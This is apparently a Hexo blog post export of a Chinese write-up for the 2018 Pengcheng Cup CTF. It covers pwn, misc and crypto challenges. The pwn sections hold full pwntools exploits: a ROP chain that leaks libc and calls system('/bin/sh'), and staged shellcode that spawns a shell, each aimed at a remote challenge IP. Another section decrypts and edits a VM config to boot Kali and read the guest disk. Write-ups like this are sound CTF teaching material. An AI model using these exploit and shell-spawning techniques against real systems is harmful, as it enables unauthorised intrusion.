= libc_base + 0x045390\nprint \"system_addr :\" +hex(system_addr)\nprint \"binsh_addr :\" +hex(binsh_addr)\n\n#gdb.attach(p,\"b *0x400AAC\")\n\np.recvuntil(\"Please set arrary number:\")\np.send(\"over\")\np.recvuntil(\"How many numbers do you have?\\n\")\np.send(p32(10))\nfor i in range(9):\n\tdata = p.recv()\n\tp.send(p32(0))\np.recv() \np.send(p32(0x20633372))\np.recvuntil(\"How many positions you want to modify?\\n\")\np.send(p32(24))\nstring = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi\nchange_addr(0x38,string)\nstring = pack('L',binsh_addr)\nchange_addr(0x40,string)\nstring = pack('L',system_addr)\nchange_addr(0x48,string)\n\np.interactive()\n```\n#### 0x01 treasure\n这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。\nexp如下：\n```\nfrom pwn import *\nfrom struct import pack\n\ncontext(os='linux',arch='amd64',aslr = 'False')\nlocal = 1\nlog_level='debug'\n\nif local:\n\tp = process(\"./treasure\")#,env={'LD_PRELOAD':'./libc_x64.so.6'})\n\telf = ELF(\"./treasure\")\n\t#libc = ELF('./libc_x64.so.6')\nelse:\n\tp = remote('58.20.46.148',35272)\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\n\ndef mycode(shellcode):\n\tp.recvuntil(\"(enter 'n' to quit) :\")\n\tp.sendline(\"\\x90\")\n\tp.recvuntil(\"start!!!!\")\n\tp.send(shellcode)\n\ntest = \"abcdefghi\"\n\n#gdb.attach(p,\"b *0x4009BA\" ) #b *0x400AAE\")\n\ntrea_addr = 0x4009BA\n\nshellcode = asm(\"mov r15,rdx;\"+\"nop;\"*6)\nmycode(shellcode)\nshellcode = asm(\"mov ebx,0x400A6c;mov r14,rbx;\"+\"nop;\"*1)\nmycode(shellcode)\n\nshellcode = asm(\"mov ebx,30;\"+\"nop;\"*4)\nmycode(shellcode)\n\nshellcode = asm(\"mov rax,r15;mov rsi,rbx;jmp r14;\")\nmycode(shellcode)\n\nshellcode = \"\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05\"\np.sendline(shellcode)\n\"\"\"\np.recvuntil(\"(enter 'n' to quit) :\")\np.sendline(\"\\x90\")\np.recvuntil(\"start!!!!\")\np.send(test)\n\"\"\"\np.interactive()\n\n```\n\n### MISC\n#### 0x02 traffic light\n题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag\n\n#### 0x03 GreatWall\nlsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符\n```\n#encoding:utf-8\nlist1 = [1010011,1110100,110011,1100111,110100,1101110,110000,1100111,1110010,110100,1110000,1101000,1111001,1011111,110001,1110011,1011111,110001,1101110,1110100,110011,1110010,110011,1110011,1110100,110001,1101110,1100111]\nj = ''\nresult =''\nfor i in range(len(list1)):\n    tmp = int(str(list1[i]),2)\n    result += chr(tmp)\n    print result\n```\n#### 0x04 hack1t\n这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解\n[GitHub项目](https://github.com/RF3/VMwareVMX)\n但是这个项目的代码有一点瑕疵，直接解密会触发一个错误\n![1](/img/2018-12-03/1.png)\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" \nPassword:\nError: File Ubuntu 64-bit.vmx is not a valid VMX file\n```\n原因是代码中给的`displayname`是小写，但是判断却是大写`displayName`,修改成小写即可\n![2](/img/2018-12-03/2.png)\n然后就可以得到解密后的vmx配置信息\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" \nPassword:\nguestos = \"ubuntu-64\"\nvirtualhw.version = \"13\"\nconfig.version = \"8\"\nnumvcpus = \"2\"\ncpuid.coresPerSocket = \"1\"\nmemsize = \"2048\"\npciBridge0.present = \"TRUE\"\npciBridge4.present = \"TRUE\"\npciBridge4.virtualDev = \"pcieRootPort\"\npciBridge4.functions = \"8\"\npciBridge5.present = \"TRUE\"\npciBridge5.virtualDev = \"pcieRootPort\"\npciBridge5.functions = \"8\"\npciBridge6.present = \"TRUE\"\npciBridge6.virtualDev = \"pcieRootPort\"\npciBridge6.functions = \"8\"\npciBridge7.present = \"TRUE\"\npciBridge7.virtualDev = \"pcieRootPort\"\npciBridge7.functions = \"8\"\nvmci0.present = \"TRUE\"\nmks.enable3d = \"true\"\nscsi0:0.present = \"TRUE\"\nscsi0:0.deviceType = \"disk\"\nscsi0:0.fileName = \"Ubuntu 64-bit-disk1.vmdk\"\nscsi0:0.mode = \"persistent\"\nscsi0.virtualDev = \"lsilogic\"\nscsi0.present = \"TRUE\"\nsata0.present = \"TRUE\"\nvmci0.unrestricted = \"false\"\nvcpu.hotadd = \"true\"\nmem.hotadd = \"true\"\npowerType.powerOff = \"soft\"\npowerType.reset = \"soft\"\npowerType.suspend = \"soft\"\ntoolscripts.afterpoweron = \"true\"\ntoolscripts.afterresume = \"true\"\ntoolscripts.beforepoweroff = \"true\"\ntoolscripts.beforesuspend = \"true\"\ntools.syncTime = \"false\"\nnvram = \"Ubuntu 64-bit-file1.nvram\"\nvirtualHW.productCompatibility = \"hosted\"\nextendedConfigFile = \"Ubuntu 64-bit.vmxf\"\ndataFileKey = \"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d\"\ncryptoState = \"encrypted\"\nisolation.tools.copy.disable = \"TRUE\"\nisolation.tools.dnd.disable = \"TRUE\"\nisolation.tools.paste.disable = \"TRUE\"\npolicy.vm.mvmtid = \"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29\"\nrollingTier0.uid = \"1\"\nrollingTier0.interval = \"86400\"\nrollingTier0.maximum = \"1\"\nrollingTier0.clientFlags = \"8\"\nrollingTier0.displayName = \"自动保护快照\"\nrollingTier1.uid = \"2\"\nrollingTier1.interval = \"604800\"\nrollingTier1.baseTier = \"1\"\nrollingTier1.baseTierInterval = \"7\"\nrollingTier1.maximum = \"1\"\nrollingTier1.clientFlags = \"8\"\nrollingTier1.displayName = \"自动保护快照\"\nrollingTier2.uid = \"3\"\nrollingTier2.interval = \"2419200\"\nrollingTier2.baseTier = \"1\"\nrollingTier2.baseTierInterval = \"28\"\nrollingTier2.maximum = \"1\"\nrollingTier2.clientFlags = \"8\"\nrollingTier2.displayName = \"自动保护快照\"\nsnapshot.numRollingTiers = \"3\"\nfloppy0.present = \"FALSE\"\nuuid.bios = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"\nuuid.location = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"\nmigrate.hostlog = \".\\Ubuntu 64-bit-0dae80fb.hlog\"\nscsi0:0.redo = \"\"\npciBridge0.pciSlotNumber = \"17\"\npciBridge4.pciSlotNumber = \"21\"\npciBridge5.pciSlotNumber = \"22\"\npciBridge6.pciSlotNumber = \"23\"\npciBridge7.pciSlotNumber = \"24\"\nscsi0.pciSlotNumber = \"16\"\nvmci0.pciSlotNumber = \"32\"\nsata0.pciSlotNumber = \"33\"\nvmci0.id = \"-119750326\"\nmonitor.phys_bits_used = \"43\"\nvmotion.checkpointFBSize = \"4194304\"\nvmotion.checkpointSVGAPrimarySize = \"134217728\"\ncleanShutdown = \"TRUE\"\nsoftPowerOff = \"FALSE\"\nsvga.guestBackedPrimaryAware = \"TRUE\"\nrollingTier0.timeSincelast = \"203\"\nrollingTier1.timeSincelast = \"203\"\nrollingTier2.timeSincelast = \"203\"\nsvga.vramSize = \"134217728\"\n```\n用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码\n```\nsata0:0.deviceType = \"cdrom-image\"\nsata0:0.fileName = \"D:\\kali\\kali-linux-2018.2-amd64.iso\"\nsata0:0.present = \"TRUE\"\n```\n加到上面的代码上去重新加密一下\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb ubuntu.vmx result.vmx\n```\n`-D`指定虚拟机的名字，`ubuntu.vmx`待加密的文件，`result.vmx`加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD\n![3](/img/2018-12-03/3.png)\n开机按esc进BIOS选CD/DVD启动\n![4](/img/2018-12-03/4.png)\n选第一个\n![5](/img/2018-12-03/5.png)\n进到kali里打开文件系统\n![6](/img/2018-12-03/6.jpg)\nfind一下\n![7](/img/2018-12-03/7.png)\n把4个部分凑一起打开就getflag\n![8](/img/2018-12-03/8.png)\n\n#### 0x05 What’s_this\n[文件删了复现不了了，只能看大佬的博客了](https://delcoding.github.io/2018/12/pcb-writeup/)\n\n### CRYPTO\n#### 0x04 easy crypto\n本质就是异或，逆操作一遍就可以了\npayloa如下：\n```\n#!usr/bin/python \n#_*_ coding=UTF-8 _*_\n\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex, a2b_hex\nfrom Crypto import Random\nimport sys\n#from FLAG import flag\n\nclass aesdemo:\n\t#aes = AES.new(key,mode)\n\tdef __init__(self,key):\n\t\tself.key = key\n\t\t#self.BS=BS\n\t\n       \n\tdef pad(self,msg):\n\t\t#BS = AES.block_size \n\t\t# aes数据分组长度为128 bit\n\t\tbyte = 16 - len(msg) % 16\n\t\treturn msg + chr(byte) * byte\n\tdef unpad(msg):\n\t\tif not msg:\n\t\t\treturn ''\n\t\treturn msg[:-ord(msg[-1])]\t\t\n    \n\tdef xor(self,a, b):\n    \t\t#assert len(a) == len(b)\n    \t\treturn ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])\n\n\tdef split_by(self,data,step):\n        \treturn [data[i : i+step] for i in xrange(0, len(data), step)]\n\n\tdef encrypt(self, plaintext):\n        # 生成随机初始向量IV\n\t\tiv = Random.new().read(16)\n\t\tprint \"iv is\",iv.encode('hex')\n\t\taes = AES.new(self.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=\"\"\n\n\t\tmsg=self.pad(plaintext)\n\t\tfor block in self.split_by(msg, 16):\n\t\t\tct_block = self.xor(block, prev_pt)\n\t\t\tct_block = aes.encrypt(ct_block)\n\t\t\tct_block = self.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\treturn b2a_hex(iv + ct)\n\n\tdef decrypt(self, ciphertext,iv):\n        # 生成随机初始向量IV\n\t\tprint \"iv is\",iv.encode('hex')\n\t\taes = AES.new(self.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=\"\"\n\n\t\t#msg=self.pad(plaintext)\n\t\tfor block in self.split_by(ciphertext, 16):\n\t\t\tct_block = self.xor(block, prev_pt)\n\t\t\tct_block = aes.decrypt(ct_block)\n\t\t\tct_block = self.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\treturn b2a_hex(iv + ct)\n\t\t\ns = '524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa' \niv = s[0:32].decode('hex')\nsc = s[32::].decode('hex')\nprint len(iv),len(sc)\nflag = 'A'*64\n\nBS = AES.block_size # aes数据分组长度为128 bit\nkey=\"asdfghjkl1234567890qwertyuiopzxc\"\ndemo = aesdemo(key)\ne = demo.encrypt(flag)\nprint(\"加密：\", e)\n\naaa = demo.decrypt(sc,iv)\nprint aaa\nprint aaa.decode('hex')\n```","source":"_posts/2018-12-03-PCBCTFwp.md","raw":"---\ntitle: PCB鹏城杯CTFwriteup&复现\nindex_img: /img/2018-12-03/index.png\ndate: 2018-12-03 12:33:23\ntags: \n- writeup\n- misc\n- PCB鹏城杯\n- pwn\n- crypro\n---\n**大大大佬的博客->[传送门](https://delcoding.github.io/2018/12/pcb-writeup/)**\n\n<!--more-->\n### PWN\n#### 0x00 overInt\n思路：有两个key的检测，过了之后有一个循环以下内容\n```\n*(&v8 + v6) = v5;\nv3 = (int *)(unsigned int)v5;\nprintf(\"str_pos is %c\\n\", v3);\n```\n这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop\nexp如下\n```\nfrom pwn import *\nfrom struct import pack\ncontext(os='linux',arch='amd64',aslr = 'False')\nlocal = 0\nlog_level='debug'\n\nif local:\n\tp = process(\"./overInt\")#,env={'LD_PRELOAD':'./libc_x64.so.6'})\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\nelse:\n\tp = remote('58.20.46.148',35272)\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\n\ndef change_addr(num,string):\n\tj = 0\n\tfor i in range(8):\n\t\tp.recvuntil(\"Which position you want to modify?\\n\")\n\t\tpayload = p32(num)\n\t\tp.send(payload)\n\t\tp.recvuntil(\"What content you want to write in?\\n\")\n\t\tpayload = string[j]\n\t\tp.send(payload)\n\t\tnum += 1\n\t\tj += 1\n\t\t\npop_rdi = 0x0000000000400b13\nread_got = elf.got[\"read\"] # 0x602038\nalarm_got = elf.got[\"alarm\"] # 0x602030\nstart = 0x4005D0\nputs_plt = elf.plt[\"puts\"] # 0x40054c\n\n#gdb.attach(p,\"b *0x400AAC\")\n\np.recvuntil(\"Please set arrary number:\")\np.send(\"over\")\np.recvuntil(\"How many numbers do you have?\\n\")\np.send(p32(10))\nfor i in range(9):\n\tdata = p.recv()\n\tp.send(p32(0))\np.recv() \np.send(p32(0x20633372))\n\np.recvuntil(\"How many positions you want to modify?\\n\")\np.send(p32(32))\n\nstring = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi\nchange_addr(0x38,string)\nstring = \"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\" #read_got\nchange_addr(0x40,string)\nstring = \"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #puts_plt\nchange_addr(0x48,string)\nstring = \"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #start\nchange_addr(0x50,string)\np.recvuntil(\"!\")\ndata = p.recvuntil(\"\\n\",drop=True)\ndata = data.ljust(8,\"\\x00\")\ndata = u64(data)\nlibc_base = data - 0x0f7250\nprint \"base : \"+hex(libc_base)\nbinsh_addr = libc_base + 0x18cd57\nsystem_addr = libc_base + 0x045390\nprint \"system_addr :\" +hex(system_addr)\nprint \"binsh_addr :\" +hex(binsh_addr)\n\n#gdb.attach(p,\"b *0x400AAC\")\n\np.recvuntil(\"Please set arrary number:\")\np.send(\"over\")\np.recvuntil(\"How many numbers do you have?\\n\")\np.send(p32(10))\nfor i in range(9):\n\tdata = p.recv()\n\tp.send(p32(0))\np.recv() \np.send(p32(0x20633372))\np.recvuntil(\"How many positions you want to modify?\\n\")\np.send(p32(24))\nstring = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdi\nchange_addr(0x38,string)\nstring = pack('L',binsh_addr)\nchange_addr(0x40,string)\nstring = pack('L',system_addr)\nchange_addr(0x48,string)\n\np.interactive()\n```\n#### 0x01 treasure\n这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。\nexp如下：\n```\nfrom pwn import *\nfrom struct import pack\n\ncontext(os='linux',arch='amd64',aslr = 'False')\nlocal = 1\nlog_level='debug'\n\nif local:\n\tp = process(\"./treasure\")#,env={'LD_PRELOAD':'./libc_x64.so.6'})\n\telf = ELF(\"./treasure\")\n\t#libc = ELF('./libc_x64.so.6')\nelse:\n\tp = remote('58.20.46.148',35272)\n\telf = ELF(\"./overInt\")\n\t#libc = ELF('./libc_x64.so.6')\n\ndef mycode(shellcode):\n\tp.recvuntil(\"(enter 'n' to quit) :\")\n\tp.sendline(\"\\x90\")\n\tp.recvuntil(\"start!!!!\")\n\tp.send(shellcode)\n\ntest = \"abcdefghi\"\n\n#gdb.attach(p,\"b *0x4009BA\" ) #b *0x400AAE\")\n\ntrea_addr = 0x4009BA\n\nshellcode = asm(\"mov r15,rdx;\"+\"nop;\"*6)\nmycode(shellcode)\nshellcode = asm(\"mov ebx,0x400A6c;mov r14,rbx;\"+\"nop;\"*1)\nmycode(shellcode)\n\nshellcode = asm(\"mov ebx,30;\"+\"nop;\"*4)\nmycode(shellcode)\n\nshellcode = asm(\"mov rax,r15;mov rsi,rbx;jmp r14;\")\nmycode(shellcode)\n\nshellcode = \"\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05\"\np.sendline(shellcode)\n\"\"\"\np.recvuntil(\"(enter 'n' to quit) :\")\np.sendline(\"\\x90\")\np.recvuntil(\"start!!!!\")\np.send(test)\n\"\"\"\np.interactive()\n\n```\n\n### MISC\n#### 0x02 traffic light\n题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag\n\n#### 0x03 GreatWall\nlsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符\n```\n#encoding:utf-8\nlist1 = [1010011,1110100,110011,1100111,110100,1101110,110000,1100111,1110010,110100,1110000,1101000,1111001,1011111,110001,1110011,1011111,110001,1101110,1110100,110011,1110010,110011,1110011,1110100,110001,1101110,1100111]\nj = ''\nresult =''\nfor i in range(len(list1)):\n    tmp = int(str(list1[i]),2)\n    result += chr(tmp)\n    print result\n```\n#### 0x04 hack1t\n这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解\n[GitHub项目](https://github.com/RF3/VMwareVMX)\n但是这个项目的代码有一点瑕疵，直接解密会触发一个错误\n![1](/img/2018-12-03/1.png)\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" \nPassword:\nError: File Ubuntu 64-bit.vmx is not a valid VMX file\n```\n原因是代码中给的`displayname`是小写，但是判断却是大写`displayName`,修改成小写即可\n![2](/img/2018-12-03/2.png)\n然后就可以得到解密后的vmx配置信息\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py \"Ubuntu 64-bit.vmx\" \nPassword:\nguestos = \"ubuntu-64\"\nvirtualhw.version = \"13\"\nconfig.version = \"8\"\nnumvcpus = \"2\"\ncpuid.coresPerSocket = \"1\"\nmemsize = \"2048\"\npciBridge0.present = \"TRUE\"\npciBridge4.present = \"TRUE\"\npciBridge4.virtualDev = \"pcieRootPort\"\npciBridge4.functions = \"8\"\npciBridge5.present = \"TRUE\"\npciBridge5.virtualDev = \"pcieRootPort\"\npciBridge5.functions = \"8\"\npciBridge6.present = \"TRUE\"\npciBridge6.virtualDev = \"pcieRootPort\"\npciBridge6.functions = \"8\"\npciBridge7.present = \"TRUE\"\npciBridge7.virtualDev = \"pcieRootPort\"\npciBridge7.functions = \"8\"\nvmci0.present = \"TRUE\"\nmks.enable3d = \"true\"\nscsi0:0.present = \"TRUE\"\nscsi0:0.deviceType = \"disk\"\nscsi0:0.fileName = \"Ubuntu 64-bit-disk1.vmdk\"\nscsi0:0.mode = \"persistent\"\nscsi0.virtualDev = \"lsilogic\"\nscsi0.present = \"TRUE\"\nsata0.present = \"TRUE\"\nvmci0.unrestricted = \"false\"\nvcpu.hotadd = \"true\"\nmem.hotadd = \"true\"\npowerType.powerOff = \"soft\"\npowerType.reset = \"soft\"\npowerType.suspend = \"soft\"\ntoolscripts.afterpoweron = \"true\"\ntoolscripts.afterresume = \"true\"\ntoolscripts.beforepoweroff = \"true\"\ntoolscripts.beforesuspend = \"true\"\ntools.syncTime = \"false\"\nnvram = \"Ubuntu 64-bit-file1.nvram\"\nvirtualHW.productCompatibility = \"hosted\"\nextendedConfigFile = \"Ubuntu 64-bit.vmxf\"\ndataFileKey = \"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d\"\ncryptoState = \"encrypted\"\nisolation.tools.copy.disable = \"TRUE\"\nisolation.tools.dnd.disable = \"TRUE\"\nisolation.tools.paste.disable = \"TRUE\"\npolicy.vm.mvmtid = \"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29\"\nrollingTier0.uid = \"1\"\nrollingTier0.interval = \"86400\"\nrollingTier0.maximum = \"1\"\nrollingTier0.clientFlags = \"8\"\nrollingTier0.displayName = \"自动保护快照\"\nrollingTier1.uid = \"2\"\nrollingTier1.interval = \"604800\"\nrollingTier1.baseTier = \"1\"\nrollingTier1.baseTierInterval = \"7\"\nrollingTier1.maximum = \"1\"\nrollingTier1.clientFlags = \"8\"\nrollingTier1.displayName = \"自动保护快照\"\nrollingTier2.uid = \"3\"\nrollingTier2.interval = \"2419200\"\nrollingTier2.baseTier = \"1\"\nrollingTier2.baseTierInterval = \"28\"\nrollingTier2.maximum = \"1\"\nrollingTier2.clientFlags = \"8\"\nrollingTier2.displayName = \"自动保护快照\"\nsnapshot.numRollingTiers = \"3\"\nfloppy0.present = \"FALSE\"\nuuid.bios = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"\nuuid.location = \"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"\nmigrate.hostlog = \".\\Ubuntu 64-bit-0dae80fb.hlog\"\nscsi0:0.redo = \"\"\npciBridge0.pciSlotNumber = \"17\"\npciBridge4.pciSlotNumber = \"21\"\npciBridge5.pciSlotNumber = \"22\"\npciBridge6.pciSlotNumber = \"23\"\npciBridge7.pciSlotNumber = \"24\"\nscsi0.pciSlotNumber = \"16\"\nvmci0.pciSlotNumber = \"32\"\nsata0.pciSlotNumber = \"33\"\nvmci0.id = \"-119750326\"\nmonitor.phys_bits_used = \"43\"\nvmotion.checkpointFBSize = \"4194304\"\nvmotion.checkpointSVGAPrimarySize = \"134217728\"\ncleanShutdown = \"TRUE\"\nsoftPowerOff = \"FALSE\"\nsvga.guestBackedPrimaryAware = \"TRUE\"\nrollingTier0.timeSincelast = \"203\"\nrollingTier1.timeSincelast = \"203\"\nrollingTier2.timeSincelast = \"203\"\nsvga.vramSize = \"134217728\"\n```\n用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码\n```\nsata0:0.deviceType = \"cdrom-image\"\nsata0:0.fileName = \"D:\\kali\\kali-linux-2018.2-amd64.iso\"\nsata0:0.present = \"TRUE\"\n```\n加到上面的代码上去重新加密一下\n```\nroot@Ubuntu:~/Desktop/VMwareVMX-master# python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb ubuntu.vmx result.vmx\n```\n`-D`指定虚拟机的名字，`ubuntu.vmx`待加密的文件，`result.vmx`加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD\n![3](/img/2018-12-03/3.png)\n开机按esc进BIOS选CD/DVD启动\n![4](/img/2018-12-03/4.png)\n选第一个\n![5](/img/2018-12-03/5.png)\n进到kali里打开文件系统\n![6](/img/2018-12-03/6.jpg)\nfind一下\n![7](/img/2018-12-03/7.png)\n把4个部分凑一起打开就getflag\n![8](/img/2018-12-03/8.png)\n\n#### 0x05 What’s_this\n[文件删了复现不了了，只能看大佬的博客了](https://delcoding.github.io/2018/12/pcb-writeup/)\n\n### CRYPTO\n#### 0x04 easy crypto\n本质就是异或，逆操作一遍就可以了\npayloa如下：\n```\n#!usr/bin/python \n#_*_ coding=UTF-8 _*_\n\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex, a2b_hex\nfrom Crypto import Random\nimport sys\n#from FLAG import flag\n\nclass aesdemo:\n\t#aes = AES.new(key,mode)\n\tdef __init__(self,key):\n\t\tself.key = key\n\t\t#self.BS=BS\n\t\n       \n\tdef pad(self,msg):\n\t\t#BS = AES.block_size \n\t\t# aes数据分组长度为128 bit\n\t\tbyte = 16 - len(msg) % 16\n\t\treturn msg + chr(byte) * byte\n\tdef unpad(msg):\n\t\tif not msg:\n\t\t\treturn ''\n\t\treturn msg[:-ord(msg[-1])]\t\t\n    \n\tdef xor(self,a, b):\n    \t\t#assert len(a) == len(b)\n    \t\treturn ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])\n\n\tdef split_by(self,data,step):\n        \treturn [data[i : i+step] for i in xrange(0, len(data), step)]\n\n\tdef encrypt(self, plaintext):\n        # 生成随机初始向量IV\n\t\tiv = Random.new().read(16)\n\t\tprint \"iv is\",iv.encode('hex')\n\t\taes = AES.new(self.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=\"\"\n\n\t\tmsg=self.pad(plaintext)\n\t\tfor block in self.split_by(msg, 16):\n\t\t\tct_block = self.xor(block, prev_pt)\n\t\t\tct_block = aes.encrypt(ct_block)\n\t\t\tct_block = self.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\treturn b2a_hex(iv + ct)\n\n\tdef decrypt(self, ciphertext,iv):\n        # 生成随机初始向量IV\n\t\tprint \"iv is\",iv.encode('hex')\n\t\taes = AES.new(self.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=\"\"\n\n\t\t#msg=self.pad(plaintext)\n\t\tfor block in self.split_by(ciphertext, 16):\n\t\t\tct_block = self.xor(block, prev_pt)\n\t\t\tct_block = aes.decrypt(ct_block)\n\t\t\tct_block = self.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\treturn b2a_hex(iv + ct)\n\t\t\ns = '524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa' \niv = s[0:32].decode('hex')\nsc = s[32::].decode('hex')\nprint len(iv),len(sc)\nflag = 'A'*64\n\nBS = AES.block_size # aes数据分组长度为128 bit\nkey=\"asdfghjkl1234567890qwertyuiopzxc\"\ndemo = aesdemo(key)\ne = demo.encrypt(flag)\nprint(\"加密：\", e)\n\naaa = demo.decrypt(sc,iv)\nprint aaa\nprint aaa.decode('hex')\n```","slug":"PCBCTFwp","published":1,"mouth":"12","updated":"2020-09-18T03:35:06.940Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxd000iez8kmxthbkjk","content":"<p><strong>大大大佬的博客-&gt;<a href=\"https://delcoding.github.io/2018/12/pcb-writeup/\" target=\"_blank\" rel=\"noopener\">传送门</a></strong></p>\n<a id=\"more\"></a>\n<h3 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h3><h4 id=\"0x00-overInt\"><a href=\"#0x00-overInt\" class=\"headerlink\" title=\"0x00 overInt\"></a>0x00 overInt</h4><p>思路：有两个key的检测，过了之后有一个循环以下内容<br><pre><code class=\"hljs undefined\">*(&amp;<span class=\"hljs-built_in\">v8</span> + <span class=\"hljs-built_in\">v6</span>) = <span class=\"hljs-built_in\">v5</span><span class=\"hljs-comment\">;</span>\n<span class=\"hljs-symbol\">v3</span> = (int *)(unsigned int)<span class=\"hljs-built_in\">v5</span><span class=\"hljs-comment\">;</span>\n<span class=\"hljs-symbol\">printf</span>(<span class=\"hljs-string\">\"str_pos is %c\\n\"</span>, <span class=\"hljs-built_in\">v3</span>)<span class=\"hljs-comment\">;</span></code></pre></p>\n<p>这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop<br>exp如下<br><pre><code class=\"hljs undefined\">from pwn import *\nfrom struct import pack\ncontext(os=<span class=\"hljs-string\">'linux'</span>,arch=<span class=\"hljs-string\">'amd64'</span>,aslr = <span class=\"hljs-string\">'False'</span>)\n<span class=\"hljs-keyword\">local</span> = <span class=\"hljs-number\">0</span>\nlog_level=<span class=\"hljs-string\">'debug'</span>\n\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">local</span>:\n\tp = process(<span class=\"hljs-string\">\"./overInt\"</span>)<span class=\"hljs-meta\">#,env=&#123;<span class=\"hljs-string\">'LD_PRELOAD'</span>:<span class=\"hljs-string\">'./libc_x64.so.6'</span>&#125;)</span>\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t<span class=\"hljs-meta\">#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)</span>\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">'58.20.46.148'</span>,<span class=\"hljs-number\">35272</span>)\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t<span class=\"hljs-meta\">#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)</span>\n\ndef change_addr(num,<span 